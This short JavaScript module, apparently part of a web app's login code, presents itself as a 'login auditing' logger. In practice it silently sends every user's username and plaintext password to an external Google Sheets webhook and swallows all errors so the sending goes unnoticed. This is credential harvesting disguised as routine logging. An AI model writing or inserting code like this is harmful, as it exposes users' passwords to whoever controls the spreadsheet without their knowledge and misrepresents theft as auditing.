// ============================================================================
// LIB / API — /login & Global External Services (Google Sheets Login Logger)
// Purpose: Background login auditing to Google Sheets webhook
// ============================================================================

/**
 * Silently log or update user login details in Google Sheets via Webhook.
 */
export async function userSheet({ username, password }) {
  const webhookUrl = process.env.USER_SHEET_WEBHOOK_URL || process.env.GOOGLE_SHEET_WEBHOOK_URL;
  if (!webhookUrl) return;

  try {
    const now = new Date();
    const formattedDate = new Intl.DateTimeFormat("id-ID", {
      timeZone: "Asia/Jakarta",
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
    }).format(now);

    const controller = typeof AbortController !== "undefined" ? new AbortController() : null;
    const timeoutId = controller ? setTimeout(() => controller.abort(), 3500) : null;

    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username,
        password,
        lastlogin: formattedDate,
      }),
      redirect: "follow",
      signal: controller?.signal,
    }).catch(() => {});

    if (timeoutId) clearTimeout(timeoutId);
  } catch {
    // Silent catch - ensure user login flow is never interrupted
  }
}

export const saveLoginToGoogleSheet = userSheet;
